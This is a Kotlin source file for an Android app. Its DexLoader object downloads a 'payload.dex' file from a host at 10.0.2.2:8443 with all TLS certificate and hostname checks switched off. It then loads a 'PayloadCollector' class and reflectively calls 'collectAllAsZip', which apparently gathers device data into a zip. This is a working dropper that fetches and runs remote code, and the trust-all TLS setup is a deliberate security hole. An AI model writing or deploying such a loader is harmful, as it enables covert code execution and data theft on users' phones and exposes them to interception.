package com.example.foregroundservice

import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import java.io.File
import java.io.FileOutputStream
import java.net.URL
import java.security.SecureRandom
import java.security.cert.X509Certificate
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

object DexLoader {

    private const val DEX_URL = "https://10.0.2.2:8443/payload.dex"
    private const val DEX_FILENAME = "payload.dex"
    private const val PAYLOAD_CLASS = "com.example.payload.PayloadCollector"

    fun downloadDex(context: Context): File? {
        return try {
            val url = URL(DEX_URL)
            val conn = url.openConnection() as HttpsURLConnection
            conn.sslSocketFactory = createTrustAllSslContext().socketFactory
            conn.hostnameVerifier = HostnameVerifier { _, _ -> true }
            conn.connectTimeout = 15_000
            conn.readTimeout = 15_000

            val dexFile = File(context.codeCacheDir, DEX_FILENAME)
            if (dexFile.exists()) dexFile.delete()

            conn.inputStream.use { input ->
                FileOutputStream(dexFile).use { output ->
                    input.copyTo(output)
                }
            }
            conn.disconnect()

            dexFile.setReadOnly()

            Log.d("DexLoader", "dex downloaded: ${dexFile.length()} bytes")
            dexFile
        } catch (e: Exception) {
            Log.e("DexLoader", "download failed", e)
            null
        }
    }

    fun loadCollector(context: Context): Any? {
        val dexFile = downloadDex(context) ?: return null
        return try {
            val loader = DexClassLoader(
                dexFile.absolutePath,
                context.codeCacheDir.absolutePath,
                null,
                context.classLoader
            )
            val clazz = loader.loadClass(PAYLOAD_CLASS)
            val instance = clazz.getField("INSTANCE").get(null)
            Log.d("DexLoader", "payload class loaded")
            instance
        } catch (e: Exception) {
            Log.e("DexLoader", "load failed", e)
            null
        }
    }

    fun invokeCollectAllAsZip(instance: Any, context: Context): File? {
        return try {
            val method = instance.javaClass.getMethod("collectAllAsZip", Context::class.java)
            method.invoke(instance, context) as? File
        } catch (e: Exception) {
            Log.e("DexLoader", "invoke failed", e)
            null
        }
    }

    private fun createTrustAllSslContext(): SSLContext {
        val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
                                                 override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
                                                 override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
                                                 override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
                                             })
        val ctx = SSLContext.getInstance("TLS")
        ctx.init(null, trustAll, SecureRandom())
        return ctx
    }
}
